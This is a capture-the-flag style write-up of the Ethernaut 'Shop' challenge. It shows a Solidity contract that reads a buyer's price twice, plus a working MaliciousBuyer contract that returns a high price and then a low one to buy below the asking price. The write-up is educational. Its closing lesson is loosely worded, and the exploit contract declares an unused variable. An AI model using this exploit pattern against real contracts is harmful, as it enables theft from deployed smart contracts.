# Ethernaut Challenge #21: Shop

**Objective:** Buy item for less than asking price.

**Contract Analysis:**
```solidity
interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

**The Vulnerability:**

Line 12: `price()` is called TWICE
- First: in the condition check
- Second: after `isSold = true`

**The Attack:**

Make `price()` return different values on each call:
- First call: return 100 (passes check)
- Second call: return 1 (sets low price)

**Stateful Price Contract:**
```solidity
contract MaliciousBuyer is Buyer {
  bool public toggle = false;
  
  function price() external view returns (uint) {
    // Check if item is sold
    if (!Shop(msg.sender).isSold()) {
      return 100;  // Passes check
    } else {
      return 1;    // Sets low price
    }
  }
  
  function exploit(address _shop) public {
    Shop(_shop).buy();
  }
}
```

**How it works:**
1. `buy()` calls `price()` → `isSold` is false → returns 100 ✓
2. Check passes: 100 >= 100
3. `isSold = true`
4. `price = buyer.price()` → `isSold` is now true → returns 1
5. Price set to 1!

**The Lesson:**

View functions can have side effects via external state reads.

Never assume view functions return the same value twice.

**Status:** Challenge understood. Stateful view functions.
